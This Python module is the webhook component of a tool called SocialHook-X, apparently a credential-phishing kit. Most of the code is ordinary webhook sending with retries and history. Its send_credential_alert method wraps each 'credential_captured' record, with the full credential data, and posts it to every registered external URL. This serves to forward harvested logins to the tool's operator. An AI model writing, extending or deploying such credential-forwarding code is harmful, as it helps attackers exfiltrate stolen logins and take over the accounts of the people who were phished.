"""
SocialHook-X - Webhook Handlers Module

Provides webhook support for credential notifications and external integrations.
"""

import logging
import requests
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass
from datetime import datetime

logger = logging.getLogger(__name__)


@dataclass
class WebhookConfig:
    """Webhook configuration"""
    url: str
    method: str = "POST"
    headers: Dict = None
    timeout: int = 10
    retry_count: int = 3
    active: bool = True
    
    def __post_init__(self):
        if self.headers is None:
            self.headers = {
                "Content-Type": "application/json",
                "User-Agent": "SocialHook-X/4.0"
            }


class WebhookHandler:
    """Webhook handler for external integrations"""
    
    def __init__(self):
        """Initialize webhook handler"""
        self.webhooks: List[WebhookConfig] = []
        self.history: List[Dict] = []
        self.max_history = 500
    
    def add_webhook(self, url: str, **kwargs) -> bool:
        """Add webhook
        
        Args:
            url: Webhook URL
            **kwargs: Additional configuration
        
        Returns:
            True if added, False otherwise
        """
        if not self._validate_url(url):
            logger.error(f"Invalid webhook URL: {url}")
            return False
        
        webhook = WebhookConfig(url=url, **kwargs)
        self.webhooks.append(webhook)
        logger.info(f"Added webhook: {url}")
        return True
    
    def remove_webhook(self, url: str) -> bool:
        """Remove webhook
        
        Args:
            url: Webhook URL
        
        Returns:
            True if removed, False otherwise
        """
        for i, webhook in enumerate(self.webhooks):
            if webhook.url == url:
                self.webhooks.pop(i)
                logger.info(f"Removed webhook: {url}")
                return True
        return False
    
    def send_webhook(self, webhook: WebhookConfig, data: Dict) -> bool:
        """Send webhook request
        
        Args:
            webhook: WebhookConfig
            data: Payload data
        
        Returns:
            True if successful, False otherwise
        """
        if not webhook.active:
            return False
        
        for attempt in range(webhook.retry_count):
            try:
                if webhook.method.upper() == "POST":
                    response = requests.post(
                        webhook.url,
                        json=data,
                        headers=webhook.headers,
                        timeout=webhook.timeout
                    )
                elif webhook.method.upper() == "PUT":
                    response = requests.put(
                        webhook.url,
                        json=data,
                        headers=webhook.headers,
                        timeout=webhook.timeout
                    )
                else:
                    response = requests.request(
                        webhook.method,
                        webhook.url,
                        json=data,
                        headers=webhook.headers,
                        timeout=webhook.timeout
                    )
                
                if response.status_code < 400:
                    logger.info(f"Webhook sent successfully: {webhook.url}")
                    self._record_history(webhook.url, "success", response.status_code)
                    return True
                else:
                    logger.warning(f"Webhook error {response.status_code}: {webhook.url}")
                    self._record_history(webhook.url, "error", response.status_code)
            
            except requests.exceptions.Timeout:
                logger.warning(f"Webhook timeout (attempt {attempt + 1}): {webhook.url}")
                self._record_history(webhook.url, "timeout", None)
            
            except Exception as e:
                logger.error(f"Webhook error: {e}")
                self._record_history(webhook.url, "exception", str(e))
        
        return False
    
    def send_to_all(self, data: Dict) -> int:
        """Send webhook to all registered webhooks
        
        Args:
            data: Payload data
        
        Returns:
            Number of successful sends
        """
        count = 0
        for webhook in self.webhooks:
            if self.send_webhook(webhook, data):
                count += 1
        return count
    
    def send_credential_alert(self, credential: Dict) -> int:
        """Send credential capture alert
        
        Args:
            credential: Credential data
        
        Returns:
            Number of successful sends
        """
        alert_data = {
            "event": "credential_captured",
            "timestamp": datetime.now().isoformat(),
            "credential": credential
        }
        return self.send_to_all(alert_data)
    
    def _validate_url(self, url: str) -> bool:
        """Validate webhook URL
        
        Args:
            url: URL to validate
        
        Returns:
            True if valid, False otherwise
        """
        return url.startswith(("http://", "https://"))
    
    def _record_history(self, url: str, status: str, code: Optional[int]) -> None:
        """Record webhook attempt in history
        
        Args:
            url: Webhook URL
            status: Status (success, error, timeout, exception)
            code: HTTP status code or error message
        """
        record = {
            "url": url,
            "status": status,
            "code": code,
            "timestamp": datetime.now().isoformat()
        }
        self.history.append(record)
        if len(self.history) > self.max_history:
            self.history.pop(0)
    
    def get_history(self, url: str = None) -> List[Dict]:
        """Get webhook history
        
        Args:
            url: Optional URL to filter
        
        Returns:
            List of history records
        """
        if url is None:
            return self.history.copy()
        return [h for h in self.history if h["url"] == url]
    
    def get_stats(self) -> Dict:
        """Get webhook statistics
        
        Returns:
            Statistics dictionary
        """
        success_count = sum(1 for h in self.history if h["status"] == "success")
        error_count = sum(1 for h in self.history if h["status"] == "error")
        timeout_count = sum(1 for h in self.history if h["status"] == "timeout")
        
        return {
            "total_webhooks": len(self.webhooks),
            "active_webhooks": sum(1 for w in self.webhooks if w.active),
            "total_attempts": len(self.history),
            "successful": success_count,
            "errors": error_count,
            "timeouts": timeout_count
        }
    
    def toggle_webhook(self, url: str, active: bool) -> bool:
        """Toggle webhook active status
        
        Args:
            url: Webhook URL
            active: Active status
        
        Returns:
            True if toggled, False otherwise
        """
        for webhook in self.webhooks:
            if webhook.url == url:
                webhook.active = active
                logger.info(f"Webhook {'enabled' if active else 'disabled'}: {url}")
                return True
        return False


# Global webhook handler instance
_webhook_handler = None


def get_webhook_handler() -> WebhookHandler:
    """Get or create webhook handler instance
    
    Returns:
        WebhookHandler instance
    """
    global _webhook_handler
    if _webhook_handler is None:
        _webhook_handler = WebhookHandler()
    return _webhook_handler
